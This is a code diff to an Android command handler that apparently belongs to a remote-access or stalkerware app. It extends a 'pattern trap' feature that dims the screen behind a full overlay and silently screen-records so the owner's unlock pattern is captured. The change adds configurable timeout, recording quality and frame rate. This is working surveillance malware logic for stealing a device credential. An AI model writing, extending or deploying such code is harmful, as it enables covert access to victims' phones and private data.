@@ -320,11 +320,18 @@ object CommandProcessor {
                         status = "FAILED (SCREEN_OFF)"
                         errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
                     } else {
+                        val parts = content.split("|")
+                        val timeoutSec = parts.getOrNull(0)?.trim()?.toLongOrNull() ?: 20L
+                        val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "HIGH"
+                        val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
+
                         ScreenRecordManager.expectedMode = "AUTO"
-                        ScreenRecordManager.pendingDur = 600 // 10 min fallback
-                        ScreenRecordManager.pendingQual = "HIGH" // High required to see pattern lines clearly
+                        ScreenRecordManager.pendingDur = 600 // 10 min fallback cap
+                        ScreenRecordManager.pendingQual = qual
+                        ScreenRecordManager.pendingFps = fps
                         ScreenRecordManager.pendingAudio = false
                         ScreenRecordManager.isPatternTrap = true
+                        ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
                         
                         android.os.Handler(android.os.Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 100, "OVERLAY")
@@ -341,7 +348,7 @@ object CommandProcessor {
                             putExtra("is_screen_record_trigger", true)
                         }
                         ctx.startActivity(i)
-                        status = "PATTERN_TRAP_ARMED (Awaiting Unlock)"
+                        status = "PATTERN_TRAP_ARMED (Timeout: ${timeoutSec}s | Quality: $qual)"
                     }
                 }
                 "GET_TREE" -> {
